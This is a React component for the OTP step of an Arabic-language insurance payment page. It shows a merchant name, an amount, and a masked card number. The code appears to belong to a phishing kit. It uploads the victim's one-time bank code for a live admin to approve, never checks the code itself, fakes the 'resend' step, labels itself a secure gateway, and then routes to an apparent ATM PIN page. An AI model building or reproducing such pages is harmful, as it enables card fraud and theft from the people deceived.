import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Lock, RefreshCw, Loader2, CreditCard, Info } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";

const OTPVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const o = t.otp;
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const approvalStatus = useAdminApproval(orderId, "otp");

  useEffect(() => { inputRef.current?.focus(); }, []);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved") {
      toast.success(o.verified);
      sessionStorage.setItem("insurance_order_id", orderId!);
      navigate("/insurance/atm", { state: { offer, orderId, cardLastFour } });
    } else if (approvalStatus === "rejected") {
      toast.error(o.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, cardLastFour, o.verified, o.rejected]);

  const handleVerify = async () => {
    if (otp.length < 4) return;
    setLoading(true);
    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => {
    setTimer(120); setCanResend(false); setOtp("");
    inputRef.current?.focus();
  };

  const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  const inputCls = "w-full pl-3 pr-10 py-3 rounded-xl bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-[#11998e] focus:ring-2 focus:ring-[#11998e]/20 transition-all text-center";

  return (
    <VerificationLayout title={o.title} subtitle={o.subtitle}>
      <div className="px-5 pb-5 pt-6">
        {waitingApproval ? (
          <WaitingApprovalOverlay
            title={o.waitingApproval}
            subtitle={o.waitingReview}
          />
        ) : (
          <motion.div
            className="space-y-4"
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
          >
            {/* Transaction info */}
            <motion.div
              className="rounded-xl border-2 border-border p-4 space-y-2"
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.1 }}
            >
              <div className="flex items-center justify-between text-xs">
                <span className="text-muted-foreground">التاجر</span>
                <span className="font-semibold text-foreground">{companyName}</span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-muted-foreground">المبلغ</span>
                <span className="text-sm font-bold text-foreground">{totalPrice.toLocaleString()} ر.س</span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-muted-foreground">البطاقة</span>
                <span className="font-mono font-semibold tracking-[0.2em] text-foreground" dir="ltr">•••• {cardLastFour}</span>
              </div>
            </motion.div>

            {/* OTP input */}
            <motion.div
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 }}
            >
              <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">{o.subtitle}</label>
              <p className="text-[11px] text-muted-foreground text-right mb-2">تم إرسال رمز التحقق المكون من 6 أرقام إليك</p>
              <div dir="ltr">
                <input
                  ref={inputRef}
                  type="text"
                  inputMode="numeric"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                  placeholder="••••••"
                  className={inputCls + " text-lg font-bold tracking-[0.3em]"}
                />
              </div>
            </motion.div>

            {/* Timer / Resend */}
            <div className="text-center">
              {canResend ? (
                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-[#11998e] hover:text-[#11998e]/80 mx-auto font-medium">
                  <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
                </button>
              ) : (
                <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
                  <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
                  <span className="text-xs text-[#11998e] font-bold font-mono">{fmtTime(timer)}</span>
                </div>
              )}
            </div>

            {/* Submit button */}
            <motion.button
              onClick={handleVerify}
              disabled={loading || otp.length < 4}
              className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
              style={{ backgroundColor: '#11998e' }}
              whileTap={{ scale: 0.98 }}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Lock className="w-4 h-4" />}
              <span>{loading ? o.verifying : o.confirmPayment}</span>
            </motion.button>

            {/* Info box */}
            <motion.div
              className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <div className="flex items-center justify-center gap-1.5 mb-1">
                <Info className="w-3.5 h-3.5 text-[#11998e]" />
                <p className="text-xs font-bold text-foreground">بوابة دفع آمنة</p>
              </div>
              <p className="text-[10px] text-muted-foreground">{o.secureProcess}</p>
            </motion.div>
          </motion.div>
        )}
      </div>
    </VerificationLayout>
  );
};

export default OTPVerification;
